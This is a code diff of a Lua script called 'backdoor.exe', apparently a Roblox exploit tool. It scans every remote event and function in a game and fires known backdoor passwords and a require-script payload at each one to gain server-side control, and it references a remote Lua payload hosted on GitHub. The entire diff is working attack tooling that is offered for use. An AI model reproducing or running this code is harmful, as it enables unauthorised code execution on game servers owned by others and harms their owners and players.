@@ -25,7 +25,7 @@ local alternativeSS = {
 	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
 	helpme = { [1] = "helpme" },
 	pickett = { [1] = "cGlja2V0dA==" },
-	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
+	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/harkedSS.lua"
 }
 
 local function notify(text)
@@ -44,20 +44,21 @@ local function attached(possibleWait)
 	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
 end
 
-local function validRemote(rm)
+local function validRemote(rm, _className)
 	local fullName =  rm:GetFullName()
-	local Classes = {"RemoteEvent","RemoteFunction"}
-
+	
 	if string.find(fullName, "DefaultChat") then return false end
 	if string.find(fullName, LocalPlayer.Name) then return false end
 	if rm:FindFirstChild("__FUNCTION") then return false end
 	if rm.Parent == game:GetService("JointsService") then return false end
+	
+	if rm.ClassName ~= _className then return false end
 
 	if getgenv().blacklisted then
 		if table.find(getgenv().blacklisted, fullName) then return false end
 	end
 
-	return table.find(Classes, rm.ClassName)
+	return true
 end
 
 local function harked()
@@ -83,34 +84,34 @@ local function scanGame()
 	end
 
 	for _, remote in pairs(game:GetDescendants()) do
-		if validRemote(remote) and not attached() then
-			if remote.ClassName == "RemoteEvent" then
-				if emmaBackdoor(remote) then
-					remote:FireServer(unpack(alternativeSS.emma), requireScript)
-				end
-				if runBackdoor(remote) then
-					remote:FireServer(unpack(alternativeSS.run), requireScript)
-				end
+		if validRemote(remote, "RemoteEvent") and not attached() then
+			if emmaBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.emma), requireScript)
+			end
+			if runBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.run), requireScript)
+			end
 
-				remote:FireServer(unpack(alternativeSS.helpme), requireScript)
-				remote:FireServer(unpack(alternativeSS.pickett), requireScript)
-				
-				remote:FireServer(requireScript)
-			end
-			if remote.ClassName == "RemoteFunction" then
-				remote:InvokeServer(requireScript)
-			end
-			game:GetService("RunService").Stepped:Wait()
+			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
+			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
+			remote:FireServer(requireScript)
+
 		end
 	end
-end
 
+	for _, remote in pairs(game:GetDescendants()) do
+		if validRemote(remote, "RemoteFunction") and not attached() then
+			remote:InvokeServer(requireScript)
+		end
+	end
+
+end
 
 local function Main()
 	notify("Make sure to join our Discord!\nCode: "..invCode)
 
 	scanGame()
-
+	
 	if not attached(2) then
 		notify("Unable to find backdoor.\nGame not backdoored?")
 	end
